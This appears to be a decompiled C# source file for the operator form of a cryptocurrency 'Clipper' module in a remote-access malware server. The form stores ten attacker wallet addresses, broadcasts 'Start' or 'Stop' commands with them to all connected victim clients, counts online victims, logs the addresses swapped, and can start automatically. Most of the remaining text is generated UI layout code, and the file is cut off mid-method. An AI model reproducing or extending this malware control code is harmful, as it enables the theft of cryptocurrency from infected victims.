using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms;

public class FormClipper : FormMaterial
{
	public bool work;

	public string[] CryptoWallet = new string[0];

	public List<Clients> clients = new List<Clients>();

	private IContainer components;

	public DataGridView GridClients;

	private Panel panel1;

	public MaterialSwitch materialSwitch2;

	private RJButton rjButton2;

	public RJTextBox rjTextBox10;

	public RJTextBox rjTextBox9;

	public RJTextBox rjTextBox7;

	public RJTextBox rjTextBox8;

	public RJTextBox rjTextBox5;

	public RJTextBox rjTextBox6;

	public RJTextBox rjTextBox3;

	public RJTextBox rjTextBox4;

	public RJTextBox rjTextBox1;

	public RJTextBox rjTextBox2;

	public DataGridView GridLog;

	private DataGridViewTextBoxColumn ColumnClient;

	private DataGridViewTextBoxColumn ColumnType;

	private DataGridViewTextBoxColumn ColumnAddress;

	private Timer timer1;

	public MaterialSwitch materialSwitch7;

	public FormClipper()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		if (File.Exists("local\\Clipper.json"))
		{
			Clipper clipper = JsonConvert.DeserializeObject<Clipper>(File.ReadAllText("local\\Clipper.json"));
			rjTextBox2.Texts = clipper.Btc;
			rjTextBox1.Texts = clipper.Eth;
			rjTextBox4.Texts = clipper.Stellar;
			rjTextBox3.Texts = clipper.Litecoin;
			rjTextBox6.Texts = clipper.BitcoinCash;
			rjTextBox5.Texts = clipper.monero;
			rjTextBox8.Texts = clipper.zcash;
			rjTextBox7.Texts = clipper.doge;
			rjTextBox9.Texts = clipper.dash;
			rjTextBox10.Texts = clipper.tron;
			materialSwitch2.Checked = clipper.AutoStart;
			if (clipper.AutoStart)
			{
				materialSwitch7.Checked = true;
				CryptoWallet = new string[10]
				{
					string.IsNullOrEmpty(rjTextBox2.Texts) ? "null" : rjTextBox2.Texts,
					string.IsNullOrEmpty(rjTextBox1.Texts) ? "null" : rjTextBox1.Texts,
					string.IsNullOrEmpty(rjTextBox4.Texts) ? "null" : rjTextBox4.Texts,
					string.IsNullOrEmpty(rjTextBox3.Texts) ? "null" : rjTextBox3.Texts,
					string.IsNullOrEmpty(rjTextBox6.Texts) ? "null" : rjTextBox6.Texts,
					string.IsNullOrEmpty(rjTextBox5.Texts) ? "null" : rjTextBox5.Texts,
					string.IsNullOrEmpty(rjTextBox8.Texts) ? "null" : rjTextBox8.Texts,
					string.IsNullOrEmpty(rjTextBox7.Texts) ? "null" : rjTextBox7.Texts,
					string.IsNullOrEmpty(rjTextBox9.Texts) ? "null" : rjTextBox9.Texts,
					string.IsNullOrEmpty(rjTextBox10.Texts) ? "null" : rjTextBox10.Texts
				};
				work = true;
			}
		}
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox4.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox5.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox6.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox7.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox8.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox9.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox10.BorderColor = FormMaterial.PrimaryColor;
		rjButton2.BorderColor = FormMaterial.PrimaryColor;
		rjButton2.ForeColor = FormMaterial.PrimaryColor;
		GridLog.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridLog.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridLog.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridLog.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		work = false;
		Clients[] array = clients.ToArray();
		foreach (Clients client in array)
		{
			Task.Run(delegate
			{
				client.Disconnect();
			});
		}
		GridClients.Rows.Clear();
		Save();
		Hide();
		e.Cancel = true;
	}

	private void Save()
	{
		Clipper clipper = new Clipper();
		clipper.Btc = rjTextBox2.Texts;
		clipper.Eth = rjTextBox1.Texts;
		clipper.Stellar = rjTextBox4.Texts;
		clipper.Litecoin = rjTextBox3.Texts;
		clipper.BitcoinCash = rjTextBox6.Texts;
		clipper.monero = rjTextBox5.Texts;
		clipper.zcash = rjTextBox8.Texts;
		clipper.doge = rjTextBox7.Texts;
		clipper.dash = rjTextBox9.Texts;
		clipper.tron = rjTextBox10.Texts;
		clipper.AutoStart = materialSwitch2.Checked;
		File.WriteAllText("local\\Clipper.json", JsonConvert.SerializeObject(clipper, Formatting.Indented));
	}

	private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch7.Checked)
		{
			CryptoWallet = new string[10]
			{
				string.IsNullOrEmpty(rjTextBox2.Texts) ? "null" : rjTextBox2.Texts,
				string.IsNullOrEmpty(rjTextBox1.Texts) ? "null" : rjTextBox1.Texts,
				string.IsNullOrEmpty(rjTextBox4.Texts) ? "null" : rjTextBox4.Texts,
				string.IsNullOrEmpty(rjTextBox3.Texts) ? "null" : rjTextBox3.Texts,
				string.IsNullOrEmpty(rjTextBox6.Texts) ? "null" : rjTextBox6.Texts,
				string.IsNullOrEmpty(rjTextBox5.Texts) ? "null" : rjTextBox5.Texts,
				string.IsNullOrEmpty(rjTextBox8.Texts) ? "null" : rjTextBox8.Texts,
				string.IsNullOrEmpty(rjTextBox7.Texts) ? "null" : rjTextBox7.Texts,
				string.IsNullOrEmpty(rjTextBox9.Texts) ? "null" : rjTextBox9.Texts,
				string.IsNullOrEmpty(rjTextBox10.Texts) ? "null" : rjTextBox10.Texts
			};
			string text = string.Join(",", (IEnumerable<string>)CryptoWallet);
			Clients[] array = clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(new object[2] { "Start", text });
			}
		}
		else
		{
			Clients[] array = clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(new object[1] { "Stop" });
			}
		}
		Save();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Text = $"Clipper           Online [{clients.Count}]";
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		Hide();
	}

	private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
	{
		Save();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		this.GridClients = new System.Windows.Forms.DataGridView();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialSwitch7 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjTextBox10 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox9 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox7 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox8 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox5 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox6 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox4 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.GridLog = new System.Windows.Forms.DataGridView();
		this.ColumnClient = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnType = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnAddress = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.GridClients).BeginInit();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridLog).BeginInit();
		base.SuspendLayout();
		this.GridClients.AllowUserToAddRows = false;
		this.GridClients.AllowUserToDeleteRows = false;
		this.GridClients.AllowUserToResizeColumns = false;
		this.GridClients.AllowUserToResizeRows = false;
		this.GridClients.BackgroundColor = System.Drawing.Color.White;
		this.GridClients.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridClients.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridClients.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.GridClients.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridClients.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridClients.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridClients.EnableHeadersVisualStyles = false;
		this.GridClients.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridClients.Location = new System.Drawing.Point(3, 230);
		this.GridClients.Name = "GridClients";
		this.GridClients.ReadOnly = true;
		this.GridClients.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridClients.RowHeadersVisible = false;
		this.GridClients.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridClients.ShowCellErrors = false;
		this.GridClients.ShowCellToolTips = false;
		this.GridClients.ShowEditingIcon = false;
		this.GridClients.ShowRowErrors = false;
		this.GridClients.Size = new System.Drawing.Size(801, 359);
		this.GridClients.TabIndex = 12;
		this.panel1.Controls.Add(this.materialSwitch7);
		this.panel1.Controls.Add(this.materialSwitch2);
		this.panel1.Controls.Add(this.rjButton2);
		this.panel1.Controls.Add(this.rjTextBox10);
		this.panel1.Controls.Add(this.rjTextBox9);
		this.panel1.Controls.Add(this.rjTextBox7);
		this.panel1.Controls.Add(this.rjTextBox8);
		this.panel1.Controls.Add(this.rjTextBox5);
		this.panel1.Controls.Add(this.rjTextBox6);
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.rjTextBox4);
		this.panel1.Controls.Add(this.rjTextBox1);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(801, 166);
		this.panel1.TabIndex = 11;
		this.materialSwitch7.AutoSize = true;
		this.materialSwitch7.Depth = 0;
		this.materialSwitch7.Location = new System.Drawing.Point(271, 117);
		this.materialSwitch7.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch7.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch7.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch7.Name = "materialSwitch7";
		this.materialSwitch7.Ripple = true;
		this.materialSwitch7.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch7.TabIndex = 61;
		this.materialSwitch7.Text = "Start";
		this.materialSwitch7.UseVisualStyleBackColor = true;
		this.materialSwitch7.CheckedChanged += new System.EventHandler(materialSwitch7_CheckedChanged);
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(388, 117);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(129, 37);
		this.materialSwitch2.TabIndex = 60;
		this.materialSwitch2.Text = "Auto Start";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch2.CheckedChanged += new System.EventHandler(materialSwitch2_CheckedChanged);
		this.rjButton2.BackColor = System.Drawing.Color.White;
		this.rjButton2.BackgroundColor = System.Drawing.Color.White;
		this.rjButton2.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 1;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjButton2.Location = new System.Drawing.Point(679, 121);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(92, 27);
		this.rjButton2.TabIndex = 59;
		this.rjButton2.Text = "Hide";
		this.rjButton2.TextColor = System.Drawing.Color.MediumPurple;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.rjTextBox10.BackColor = System.Drawing.Color.White;
		this.rjTextBox10.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox10.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox10.BorderRadius = 0;
		this.rjTextBox10.BorderSize = 1;
		this.rjTextBox10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox10.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox10.Location = new System.Drawing.Point(17, 121);
		this.rjTextBox10.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox10.Multiline = false;
		this.rjTextBox10.Name = "rjTextBox10";
		this.rjTextBox10.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox10.PasswordChar = false;
		this.rjTextBox10.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox10.PlaceholderText = "tron";
		this.rjTextBox10.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox10.TabIndex = 57;
		this.rjTextBox10.Texts = "";
		this.rjTextBox10.UnderlinedStyle = false;
		this.rjTextBox9.BackColor = System.Drawing.Color.White;
		this.rjTextBox9.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox9.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox9.BorderRadius = 0;
		this.rjTextBox9.BorderSize = 1;
		this.rjTextBox9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox9.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox9.Location = new System.Drawing.Point(525, 85);
		this.rjTextBox9.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox9.Multiline = false;
		this.rjTextBox9.Name = "rjTextBox9";
		this.rjTextBox9.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox9.PasswordChar = false;
		this.rjTextBox9.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox9.PlaceholderText = "dash";
		this.rjTextBox9.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox9.TabIndex = 56;
		this.rjTextBox9.Texts = "";
		this.rjTextBox9.UnderlinedStyle = false;
		this.rjTextBox7.BackColor = System.Drawing.Color.White;
		this.rjTextBox7.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox7.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox7.BorderRadius = 0;
		this.rjTextBox7.BorderSize = 1;
		this.rjTextBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox7.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox7.Location = new System.Drawing.Point(525, 49);
		this.rjTextBox7.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox7.Multiline = false;
		this.rjTextBox7.Name = "rjTextBox7";
		this.rjTextBox7.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox7.PasswordChar = false;
		this.rjTextBox7.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox7.PlaceholderText = "doge";
		this.rjTextBox7.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox7.TabIndex = 55;
		this.rjTextBox7.Texts = "";
		this.rjTextBox7.UnderlinedStyle = false;
		this.rjTextBox8.BackColor = System.Drawing.Color.White;
		this.rjTextBox8.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox8.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox8.BorderRadius = 0;
		this.rjTextBox8.BorderSize = 1;
		this.rjTextBox8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox8.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox8.Location = new System.Drawing.Point(525, 13);
		this.rjTextBox8.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox8.Multiline = false;
		this.rjTextBox8.Name = "rjTextBox8";
		this.rjTextBox8.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox8.PasswordChar = false;
		this.rjTextBox8.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox8.PlaceholderText = "zcash";
		this.rjTextBox8.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox8.TabIndex = 54;
		this.rjTextBox8.Texts = "";
		this.rjTextBox8.UnderlinedStyle = false;
		this.rjTextBox5.BackColor = System.Drawing.Color.White;
		this.rjTextBox5.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox5.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox5.BorderRadius = 0;
		this.rjTextBox5.BorderSize = 1;
		this.rjTextBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox5.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox5.Location = new System.Drawing.Point(271, 85);
		this.rjTextBox5.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox5.Multiline = false;
		this.rjTextBox5.Name = "rjTextBox5";
		this.rjTextBox5.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox5.PasswordChar = false;
		this.rjTextBox5.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox5.PlaceholderText = "monero";
		this.rjTextBox5.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox5.TabIndex = 53;
		this.rjTextBox5.Texts = "";
		this.rjTextBox5.UnderlinedStyle = false;
		this.rjTextBox6.BackColor = System.Drawing.Color.White;
		this.rjTextBox6.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox6.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox6.BorderRadius = 0;
		this.rjTextBox6.BorderSize = 1;
		this.rjTextBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox6.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox6.Location = new System.Drawing.Point(17, 85);
		this.rjTextBox6.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox6.Multiline = false;
		this.rjTextBox6.Name = "rjTextBox6";
		this.rjTextBox6.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox6.PasswordChar = false;
		this.rjTextBox6.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox6.PlaceholderText = "Bitcoin Cash";
		this.rjTextBox6.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox6.TabIndex = 52;
		this.rjTextBox6.Texts = "";
		this.rjTextBox6.UnderlinedStyle = false;
		this.rjTextBox3.BackColor = System.Drawing.Color.White;
		this.rjTextBox3.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox3.Location = new System.Drawing.Point(271, 49);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Litecoin";
		this.rjTextBox3.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox3.TabIndex = 51;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.rjTextBox4.BackColor = System.Drawing.Color.White;
		this.rjTextBox4.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox4.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox4.BorderRadius = 0;
		this.rjTextBox4.BorderSize = 1;
		this.rjTextBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox4.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox4.Location = new System.Drawing.Point(17, 49);
		this.rjTextBox4.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox4.Multiline = false;
		this.rjTextBox4.Name = "rjTextBox4";
		this.rjTextBox4.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox4.PasswordChar = false;
		this.rjTextBox4.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox4.PlaceholderText = "Stellar";
		this.rjTextBox4.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox4.TabIndex = 50;
		this.rjTextBox4.Texts = "";
		this.rjTextBox4.UnderlinedStyle = false;
		this.rjTextBox1.BackColor = System.Drawing.Color.White;
		this.rjTextBox1.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox1.Location = new System.Drawing.Point(271, 13);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Eth";
		this.rjTextBox1.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox1.TabIndex = 49;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjTextBox2.BackColor = System.Drawing.Color.White;
		this.rjTextBox2.BorderColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.MediumPurple;
		this.rjTextBox2.Location = new System.Drawing.Point(17, 13);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Btc";
		this.rjTextBox2.Size = new System.Drawing.Size(246, 28);
		this.rjTextBox2.TabIndex = 48;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.GridLog.AllowUserToAddRows = false;
		this.GridLog.AllowUserToDeleteRows = false;
		this.GridLog.AllowUserToResizeColumns = false;
		this.GridLog.AllowUserToResizeRows = false;
		this.GridLog.BackgroundColor = System.Drawing.Color.White;
		this.GridLog.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridLog.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridLog.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridLog.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.GridLog.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridLog.Columns.AddRange(this.ColumnClient, this.ColumnType, this.ColumnAddress);
		this.GridLog.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridLog.DefaultCellStyle = dataGridViewCellStyle5;
		this.GridLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridLog.EnableHeadersVisualStyles = false;
		this.GridLog.GridColor = System.Drawing.Color.MediumPurple;
		this.GridLog.Location = new System.Drawing.Point(3, 230);
